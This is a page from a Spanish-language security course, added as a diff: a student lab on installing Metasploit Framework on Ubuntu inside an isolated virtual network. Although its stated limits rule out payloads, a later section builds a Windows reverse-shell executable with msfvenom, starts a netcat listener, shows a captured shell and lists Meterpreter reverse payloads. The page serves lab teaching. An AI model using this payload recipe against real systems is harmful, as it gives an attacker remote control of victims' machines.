+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Gestión de Riesgos y Vulnerabilidades
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            Gestión de Riesgos y Vulnerabilidades
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Fundamentos de Gestión de Riesgos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            Fundamentos de Gestión de Riesgos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/fundamentos-riesgo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/fundamentos-riesgo/concepto-riesgo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Concepto de Riesgo
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/fundamentos-riesgo/tipos-riesgo-militar/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Tipos de Riesgo en Entornos Militares
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Identificación y Evaluación de Vulnerabilidades
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            Identificación y Evaluación de Vulnerabilidades
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/identificacion-vulnerabilidades/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/identificacion-vulnerabilidades/metodos-identificacion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Métodos de Identificación y Priorización
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/identificacion-vulnerabilidades/ficha-zero-day-pdca/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ficha: Alerta Zero-Day y PDCA
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+          
+        
+        <input class="md-nav__toggle md-toggle md-toggle--indeterminate" type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    Mitigación y Control de Riesgos
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            Mitigación y Control de Riesgos
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/mitigacion-controles/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Index
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/mitigacion-controles/controles-buenas-practicas/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Controles y Buenas Prácticas
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../gestion-riesgos/mitigacion-controles/examen/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Examen
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+    
+    
+      
+        
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    Conferencias Magistrales
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            Conferencias Magistrales
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    Ejercicio extra — Preparación de Metasploit
+    
+  </span>
+  
+
+      </a>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Tabla de contenidos">
+  
+  
+  
+    
+  
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<hr />
+<h1 id="duracion-sugerida-6075-minutos">Duración sugerida: 60–75 minutos<a class="headerlink" href="#duracion-sugerida-6075-minutos" title="Permanent link">&para;</a></h1>
+<h1 id="tipo-ejercicio-extra-version-alumno">Tipo: Ejercicio extra (versión alumno)<a class="headerlink" href="#tipo-ejercicio-extra-version-alumno" title="Permanent link">&para;</a></h1>
+<hr />
+<h1 id="ejercicio-extra-preparacion-de-metasploit-en-ubuntu">Ejercicio extra — Preparación de Metasploit en Ubuntu<a class="headerlink" href="#ejercicio-extra-preparacion-de-metasploit-en-ubuntu" title="Permanent link">&para;</a></h1>
+<blockquote>
+<p><strong>Duración sugerida:</strong> 60–75 minutos | <strong>Modalidad:</strong> individual o en parejas | <strong>Producto:</strong> registro de cinco evidencias</p>
+</blockquote>
+<h2 id="proposito">Propósito<a class="headerlink" href="#proposito" title="Permanent link">&para;</a></h2>
+<p>En esta práctica se preparará una VM Ubuntu como estación de laboratorio con <strong>Metasploit Framework</strong>. El objetivo es aprender a instalar la herramienta desde su fuente oficial, comprobar su base de datos y verificar la comunicación con una VM Windows 11 dentro de una red virtual aislada.</p>
+<p>Metasploit Framework es la herramienta que se instalará en Ubuntu. <strong>Metasploitable</strong> es una VM deliberadamente vulnerable distinta y no se utiliza en este ejercicio.</p>
+<p>Al finalizar, el alumno será capaz de:</p>
+<ul>
+<li>distinguir Metasploit Framework de Metasploitable;</li>
+<li>instalar Framework mediante el paquete oficial de Rapid7;</li>
+<li>comprobar el paquete, la consola y la conexión con PostgreSQL;</li>
+<li>crear un espacio de trabajo sin ejecutar módulos ofensivos;</li>
+<li>verificar un servicio conocido en una IP autorizada;</li>
+<li>retirar el acceso a Internet antes de una práctica de seguridad.</li>
+</ul>
+<div class="admonition danger">
+<p class="admonition-title">Límite de esta práctica</p>
+<p>Esta actividad termina en la preparación y verificación del entorno. No se generan ejecutables, no se configuran payloads o sesiones Meterpreter y no se intenta evadir Microsoft Defender. Tampoco se ejecutan módulos <code>exploit</code>, <code>post</code> ni acciones sobre equipos externos.</p>
+</div>
+<hr />
+<h2 id="topologia-del-laboratorio">Topología del laboratorio<a class="headerlink" href="#topologia-del-laboratorio" title="Permanent link">&para;</a></h2>
+<table>
+<thead>
+<tr>
+<th>Equipo</th>
+<th>Función</th>
+<th>Red durante la instalación</th>
+<th>Red durante la verificación</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>VM Ubuntu</strong></td>
+<td>Estación con Metasploit</td>
+<td>NAT temporal + red interna</td>
+<td>Solo red interna o <em>host-only</em></td>
+</tr>
+<tr>
+<td><strong>VM Windows 11</strong></td>
+<td>Endpoint de laboratorio</td>
+<td>Red interna; NAT no requerido</td>
+<td>Solo red interna o <em>host-only</em></td>
+</tr>
+</tbody>
+</table>
+<p>Ejemplo de direcciones en una red <em>host-only</em>:</p>
+<table>
+<thead>
+<tr>
+<th>Equipo</th>
+<th>Dirección de ejemplo</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ubuntu</td>
+<td><code>192.168.56.101</code></td>
+</tr>
+<tr>
+<td>Windows 11</td>
+<td><code>192.168.56.102</code></td>
+</tr>
+</tbody>
+</table>
+<p>Las direcciones son ejemplos. Cada alumno debe descubrir y registrar las de sus propias VMs.</p>
+<div class="admonition warning">
+<p class="admonition-title">Antes de comenzar</p>
+<ul>
+<li>Usar únicamente VMs autorizadas para el curso.</li>
+<li>Crear una instantánea con ambas VMs apagadas.</li>
+<li>No utilizar modo puente o <em>bridged</em>.</li>
+<li>Mantener Microsoft Defender, Windows Firewall, firma SMB y autenticación activados.</li>
+<li>Usar SMB 2/3; no instalar ni habilitar SMBv1.</li>
+</ul>
+</div>
+<h2 id="evidencias-requeridas">Evidencias requeridas<a class="headerlink" href="#evidencias-requeridas" title="Permanent link">&para;</a></h2>
+<p>Cada alumno debe copiar la salida relevante —o tomar una captura— para estas cinco evidencias:</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Evidencia</th>
+<th>Criterio de aprobación</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>E1</td>
+<td>Versión y arquitectura de Ubuntu</td>
+<td>Se identifica el sistema y una arquitectura soportada</td>
+</tr>
+<tr>
+<td>E2</td>
+<td>Paquete <code>metasploit-framework</code></td>
+<td>Se muestra paquete, versión y arquitectura</td>
+</tr>
+<tr>
+<td>E3</td>
+<td>Consola y base de datos</td>
+<td><code>msfconsole</code> abre y <code>db_status</code> confirma PostgreSQL</td>
+</tr>
+<tr>
+<td>E4</td>
+<td>Direcciones de la red interna</td>
+<td>Se registran las IP de Ubuntu y Windows</td>
+</tr>
+<tr>
+<td>E5</td>
+<td>Comprobación dirigida de TCP/445</td>
+<td>Se prueba solo la IP autorizada y se interpreta el resultado</td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="parte-1-preparar-ubuntu">Parte 1 — Preparar Ubuntu<a class="headerlink" href="#parte-1-preparar-ubuntu" title="Permanent link">&para;</a></h2>
+<h3 id="paso-1-comprobar-el-sistema">Paso 1 — Comprobar el sistema<a class="headerlink" href="#paso-1-comprobar-el-sistema" title="Permanent link">&para;</a></h3>
+<p>Abrir una terminal en Ubuntu:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>cat<span class="w"> </span>/etc/os-release
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>dpkg<span class="w"> </span>--print-architecture
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>uname<span class="w"> </span>-m
+</code></pre></div>
+<p>En una VM común sobre procesadores Intel o AMD de 64 bits se espera normalmente:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>amd64
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>x86_64
+</code></pre></div>
+<p>Rapid7 publica paquetes Linux <code>.deb</code> para <code>amd64</code>, <code>arm64</code>, <code>armhf</code> e <code>i386</code>. La lista vigente se encuentra en la documentación de sus <a href="https://docs.metasploit.com/docs/using-metasploit/getting-started/nightly-installers.html">instaladores oficiales</a>.</p>
+<p><strong>Registrar E1:</strong> versión de Ubuntu, resultado de <code>dpkg --print-architecture</code> y resultado de <code>uname -m</code>.</p>
+<h3 id="paso-2-descubrir-las-interfaces">Paso 2 — Descubrir las interfaces<a class="headerlink" href="#paso-2-descubrir-las-interfaces" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>ip<span class="w"> </span>-brief<span class="w"> </span>address
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>ip<span class="w"> </span>route
+</code></pre></div>
+<p>Identificar:</p>
+<ul>
+<li>la interfaz NAT, utilizada temporalmente para descargar paquetes;</li>
+<li>la interfaz interna o <em>host-only</em>, utilizada para comunicarse con Windows.</li>
+</ul>
+<p>No asumir que se llaman <code>eth0</code> o <code>eth1</code>: Ubuntu puede mostrar nombres como <code>enp0s3</code> y <code>enp0s8</code>.</p>
+<h3 id="paso-3-preparar-las-utilidades">Paso 3 — Preparar las utilidades<a class="headerlink" href="#paso-3-preparar-las-utilidades" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>sudo<span class="w"> </span>apt<span class="w"> </span>install<span class="w"> </span>--yes<span class="w"> </span>curl<span class="w"> </span>ca-certificates<span class="w"> </span>gnupg<span class="w"> </span>netcat-openbsd
+</code></pre></div>
+<p>Si <code>apt update</code> falla, revisar primero la fecha de la VM, el adaptador NAT y la resolución DNS. No continuar con una descarga incompleta.</p>
+<hr />
+<h2 id="parte-2-instalar-metasploit-framework">Parte 2 — Instalar Metasploit Framework<a class="headerlink" href="#parte-2-instalar-metasploit-framework" title="Permanent link">&para;</a></h2>
+<p>Rapid7 recomienda el instalador oficial de Metasploit para Linux. Este configura su repositorio firmado e instala el paquete junto con sus dependencias, como Ruby y PostgreSQL. El procedimiento se basa en la documentación de <a href="https://github.com/rapid7/metasploit-framework#installing-metasploit">Metasploit Framework</a> y del <a href="https://github.com/rapid7/metasploit-omnibus/blob/master/USAGE.md">paquete Omnibus</a>.</p>
+<h3 id="paso-4-descargar-el-instalador">Paso 4 — Descargar el instalador<a class="headerlink" href="#paso-4-descargar-el-instalador" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>curl<span class="w"> </span>--fail<span class="w"> </span>--show-error<span class="w"> </span>--location<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="w">  </span>--output<span class="w"> </span>msfinstall<span class="w"> </span><span class="se">\</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="w">  </span>https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb
+</code></pre></div>
+<p>Confirmar que existe y no está vacío:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>ls<span class="w"> </span>-lh<span class="w"> </span>msfinstall
+</code></pre></div>
+<h3 id="paso-5-inspeccionar-antes-de-ejecutar">Paso 5 — Inspeccionar antes de ejecutar<a class="headerlink" href="#paso-5-inspeccionar-antes-de-ejecutar" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>less<span class="w"> </span>msfinstall
+</code></pre></div>
+<p>Dentro de <code>less</code>, usar las flechas para desplazarse y presionar <code>q</code> para salir. La inspección permite confirmar que el archivo proviene de Rapid7 y que prepara un repositorio de paquetes; no es necesario comprender cada línea del script.</p>
+<div class="admonition note">
+<p class="admonition-title">Etiqueta <code>lucid</code></p>
+<p>El repositorio generado puede contener la etiqueta histórica <code>lucid</code>. Es un nombre usado por el repositorio de Rapid7: no sustituirlo manualmente por <code>jammy</code>, <code>noble</code> u otro nombre de Ubuntu.</p>
+</div>
+<h3 id="paso-6-ejecutar-el-instalador">Paso 6 — Ejecutar el instalador<a class="headerlink" href="#paso-6-ejecutar-el-instalador" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>chmod<span class="w"> </span><span class="m">755</span><span class="w"> </span>msfinstall
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>sudo<span class="w"> </span>./msfinstall
+</code></pre></div>
+<p>El proceso puede tardar varios minutos. Debe terminar sin errores de APT ni descargas incompletas.</p>
+<h3 id="paso-7-comprobar-el-paquete">Paso 7 — Comprobar el paquete<a class="headerlink" href="#paso-7-comprobar-el-paquete" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>dpkg-query<span class="w"> </span>-W<span class="w"> </span>-f<span class="o">=</span><span class="s1">'${Package} ${Version} ${Architecture}\n'</span><span class="w"> </span>metasploit-framework
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>apt-cache<span class="w"> </span>policy<span class="w"> </span>metasploit-framework
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="nb">command</span><span class="w"> </span>-v<span class="w"> </span>msfconsole
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>msfconsole<span class="w"> </span>--version
+</code></pre></div>
+<p>El primer comando debe mostrar <code>metasploit-framework</code>, su versión y arquitectura. <code>command -v</code> debe devolver una ruta al ejecutable.</p>
+<p><strong>Registrar E2:</strong> salida de <code>dpkg-query</code> y <code>msfconsole --version</code>.</p>
+<hr />
+<h2 id="parte-3-inicializar-y-verificar-metasploit">Parte 3 — Inicializar y verificar Metasploit<a class="headerlink" href="#parte-3-inicializar-y-verificar-metasploit" title="Permanent link">&para;</a></h2>
+<h3 id="paso-8-abrir-la-consola">Paso 8 — Abrir la consola<a class="headerlink" href="#paso-8-abrir-la-consola" title="Permanent link">&para;</a></h3>
+<p>Ejecutar como usuario normal, no con <code>sudo</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>msfconsole
+</code></pre></div>
+<p>Si todavía no está disponible en <code>PATH</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>/opt/metasploit-framework/bin/msfconsole
+</code></pre></div>
+<p>En el primer inicio, aceptar la creación de la base de datos cuando el asistente la ofrezca. La construcción inicial de la caché de módulos puede tardar algunos minutos.</p>
+<h3 id="paso-9-comprobar-postgresql">Paso 9 — Comprobar PostgreSQL<a class="headerlink" href="#paso-9-comprobar-postgresql" title="Permanent link">&para;</a></h3>
+<p>Dentro de <code>msfconsole</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>version
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>db_status
+</code></pre></div>
+<p>El resultado esperado de <code>db_status</code> debe indicar que PostgreSQL está conectado a Metasploit.</p>
+<p>Si no existe conexión, salir y ejecutar como usuario normal:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>exit
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>msfdb<span class="w"> </span>init
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>msfconsole
+</code></pre></div>
+<p>Después repetir <code>db_status</code>.</p>
+<h3 id="paso-10-crear-un-espacio-de-trabajo">Paso 10 — Crear un espacio de trabajo<a class="headerlink" href="#paso-10-crear-un-espacio-de-trabajo" title="Permanent link">&para;</a></h3>
+<p>Dentro de <code>msfconsole</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>workspace -a preparacion-lab
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>workspace
+</code></pre></div>
+<p>El asterisco debe aparecer junto a <code>preparacion-lab</code>. Un <em>workspace</em> organiza datos del laboratorio; crearlo no ejecuta ataques.</p>
+<p>Terminar la consola:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>exit
+</code></pre></div>
+<p>Comprobar la base desde Ubuntu:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>msfdb<span class="w"> </span>status
+</code></pre></div>
+<p><strong>Registrar E3:</strong> salida de <code>db_status</code>, el <em>workspace</em> seleccionado y <code>msfdb status</code>.</p>
+<hr />
+<h2 id="parte-4-fabricar-un-binario-con-payload">Parte 4 — Fabricar un binario con payload<a class="headerlink" href="#parte-4-fabricar-un-binario-con-payload" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>El siguiente comando se utiliza en seguridad informática y pruebas de penetración para generar un archivo ejecutable malicioso (payload) que creará una conexión remota de vuelta hacia el atacante.</p>
+</li>
+<li>
+<p>El comando pertenece a la herramienta msfvenom, que forma parte del framework de Metasploit.</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>msfvenom<span class="w"> </span>-p<span class="w"> </span>windows/x64/shell_reverse_tcp<span class="w"> </span><span class="nv">LHOST</span><span class="o">=</span><span class="m">192</span>.168.56.104<span class="w"> </span><span class="nv">LPORT</span><span class="o">=</span><span class="m">4444</span><span class="w"> </span>-f<span class="w"> </span>exe<span class="w"> </span>-o<span class="w"> </span>shell.exe
+</code></pre></div>
+<h3 id="desglose-del-comando">Desglose del comando:<a class="headerlink" href="#desglose-del-comando" title="Permanent link">&para;</a></h3>
+<ul>
+<li><code>msfvenom</code>: Invoca la herramienta para crear y compilar el código malicioso (payload).</li>
+<li><code>-p windows/x64/shell_reverse_tcp</code>: Define el payload (la carga útil).</li>
+<li><code>windows/x64</code>: Indica que el archivo está diseñado específicamente para sistemas operativos Windows de 64 bits.</li>
+<li><code>shell_reverse_tcp</code>: Indica que el comportamiento será una shell reversa mediante TCP. Al ejecutarse, la víctima iniciará una conexión saliente hacia el atacante y le entregará el control de la consola (cmd.exe).</li>
+<li><code>LHOST=192.168.56.104</code>: Significa Listening Host. Es la dirección IP del atacante (tu máquina), a la cual el archivo de la víctima intentará conectarse.</li>
+<li><code>LPORT=4444</code>: Significa Listening Port. Es el puerto del atacante que estará esperando la conexión entrante. El puerto 4444 es el valor por defecto en Metasploit.</li>
+<li><code>-f exe</code>: Define el formato de salida (format). En este caso, le indica a msfvenom que compile el payload como un archivo ejecutable tradicional de Windows (.exe).</li>
+<li>
+<p><code>-o shell.exe</code>: Define el nombre del archivo de salida (output). El ejecutable generado se guardará en tu directorio actual con el nombre shell.exe</p>
+</li>
+<li>
+<p>En la máquina Ubuntu, ejecutar:</p>
+</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>sudo<span class="w"> </span>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">4444</span>
+</code></pre></div>
+<ul>
+<li>Se supone que el binario producido (<code>shell.exe</code>) es introducido de alguna manera a la máquina de Windows, y al ejecutarse produce esta conexión en la máquina atacante:</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>user@VM-Ubuntu:~$<span class="w"> </span>sudo<span class="w"> </span>nc<span class="w"> </span>-lnvp<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="o">[</span>sudo<span class="o">]</span><span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>user:
+<a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>Listening<span class="w"> </span>on<span class="w"> </span><span class="m">0</span>.0.0.0<span class="w"> </span><span class="m">4444</span>
+<a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a>Connection<span class="w"> </span>received<span class="w"> </span>on<span class="w"> </span><span class="m">192</span>.168.56.102<span class="w"> </span><span class="m">63966</span>
+<a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a>Microsoft<span class="w"> </span>Windows<span class="w"> </span><span class="o">[</span>Versión<span class="w"> </span><span class="m">10</span>.0.26200.9168<span class="o">]</span>
+<a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="o">(</span>c<span class="o">)</span><span class="w"> </span>Microsoft<span class="w"> </span>Corporation.<span class="w"> </span>Todos<span class="w"> </span>los<span class="w"> </span>derechos<span class="w"> </span>reservados.
+<a id="__codelineno-19-7" name="__codelineno-19-7" href="#__codelineno-19-7"></a>
+<a id="__codelineno-19-8" name="__codelineno-19-8" href="#__codelineno-19-8"></a>C:<span class="se">\U</span>sers<span class="se">\o</span>perador_alumno<span class="se">\D</span>ownloads&gt;
+</code></pre></div>
+<h3 id="paso-11-buscamos-otros-payloads">Paso 11 — Buscamos otros payloads<a class="headerlink" href="#paso-11-buscamos-otros-payloads" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>msfvenom<span class="w"> </span>-l<span class="w"> </span>payloads<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"windows"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"meterpreter"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"reverse"</span>
+</code></pre></div>
+<ul>
+<li>Imprimimos</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>msfvenom<span class="w"> </span>-l<span class="w"> </span>payloads<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"windows"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"meterpreter"</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span><span class="s2">"reverse"</span>
+</code></pre></div>
+<details class="note">
+<summary>Ver lista resultante de payloads</summary>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>cmd/windows/ftp/x64/meterpreter/reverse_http
